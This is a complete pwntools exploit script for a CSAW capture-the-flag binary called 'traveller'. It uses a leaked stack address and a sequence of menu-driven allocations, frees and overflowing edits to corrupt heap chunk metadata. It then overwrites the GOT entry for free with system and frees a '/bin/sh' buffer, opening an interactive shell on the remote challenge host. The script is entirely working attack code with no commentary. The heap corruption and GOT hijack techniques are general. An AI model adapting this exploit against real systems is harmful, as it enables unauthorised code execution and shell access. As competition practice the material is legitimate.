from pwn import *
import time

libc = ELF("./libc.so.6")
e = ELF("./traveller")

p = remote("pwn.chal.csaw.io", 1003)
#p = process(e.path, {"LD_PRELOAD": libc.path})

p.recvuntil("0x")
stack_leak = int(p.recvline(), 16)

def alloc(opt=1, msg="AAAA"):
  p.sendlineafter(">", "1")
  p.sendlineafter(">", str(opt))
  p.sendlineafter(":", msg)
  p.recvuntil("4. Check a trip")

def delete(idx):
  p.sendlineafter(">", "3")
  p.sendlineafter(":", str(idx))
  p.recvuntil("4. Check a trip")

def change(idx, amt):
  p.sendlineafter(">", "2")
  p.sendlineafter(":", str(idx))
  time.sleep(1)
  p.send(amt)
  p.recvuntil("4. Check a trip")

p.recvuntil("4. Check a trip")

alloc()
alloc()
alloc(3)
delete(0)
delete(1)
alloc(3)
alloc(5)

print("Changing")
change(1, "A" * (0x100 - 0x10) + p64(0x100) + p64(0x130))

delete(1)

change(0, "A" * 0x128)

alloc(5, msg="/bin/sh")
alloc()
alloc()
alloc()

delete(4)
delete(1)

alloc(5, "A" * 0x88 + p64(0x20) + p64(e.got["free"]) + p64(0x8))
change(1, p64(e.symbols["system"]))

p.sendline("3")
p.sendline("2")

p.interactive()
